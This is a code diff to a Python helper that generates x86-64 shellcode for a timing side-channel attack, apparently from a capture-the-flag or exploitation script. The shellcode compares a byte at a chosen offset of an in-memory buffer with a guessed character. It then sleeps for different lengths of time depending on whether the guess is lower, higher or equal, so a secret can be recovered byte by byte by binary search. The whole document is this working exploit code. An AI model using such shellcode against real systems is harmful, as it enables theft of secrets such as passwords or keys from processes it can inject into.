@@ -28,18 +28,29 @@ def create_timing_shellcode(position, character):
         
         /* Check character at position {position} */
         cmp byte ptr [rsi + {position}], {character}
-        jne skip
-        
-        /* If match, nanosleep for 0.1 seconds */
+        jl less_than
+        jg greater_than
+    
+    /* If equal, nanosleep for 0.02 seconds */
+        push    10000000
         push    0
-        push    1
         mov     rdi, rsp
         xor     rsi, rsi
         mov     rax, 35
         syscall
         add rsp, 16
         
-    skip:
+        /* If greater_than, nanosleep for 0.01 seconds */
+    greater_than:
+        push    10000000
+        push    0
+        mov     rdi, rsp
+        xor     rsi, rsi
+        mov     rax, 35
+        syscall
+        add rsp, 16
+        
+    less_than:
         xor rdi, rdi
         mov rax, 60
         syscall
